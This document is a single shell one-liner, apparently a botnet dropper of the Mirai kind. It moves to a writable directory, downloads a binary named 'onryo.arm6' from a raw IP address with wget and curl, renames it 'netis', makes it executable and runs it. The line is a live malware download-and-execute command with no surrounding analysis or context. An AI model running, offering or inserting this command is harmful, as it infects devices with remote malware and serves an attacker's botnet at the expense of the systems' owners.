cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.52.37/bins/onryo.arm6; curl -O http://80.211.52.37/bins/onryo.arm6;cat onryo.arm6 >netis;chmod +x *;./netis ssh.wget
